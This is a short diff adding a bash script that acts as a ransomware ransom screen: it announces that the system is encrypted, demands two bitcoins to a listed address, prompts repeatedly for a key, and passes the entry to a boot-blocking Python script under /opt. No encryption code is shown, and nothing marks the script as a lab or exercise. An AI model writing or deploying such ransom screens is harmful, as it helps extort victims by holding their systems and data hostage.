@@ -1,0 +1,10 @@
+#!/bin/bash
+echo "YOUR SYSTEM IS ENCRYPTED!"
+echo "If you want your data back, send 2 bitcoins to this address:"
+echo "bc1qvpwfav9y0xgt74ukrgru8hfu6hpuk7p8ppps2v"
+
+until [[ -n ${REPLY} ]]; do
+    read -ep "Enter the Key: "
+done
+python3 /opt/boot_block.py ${REPLY}
+echo "KEY ENTERED: ${REPLY^^}"; sleep 5
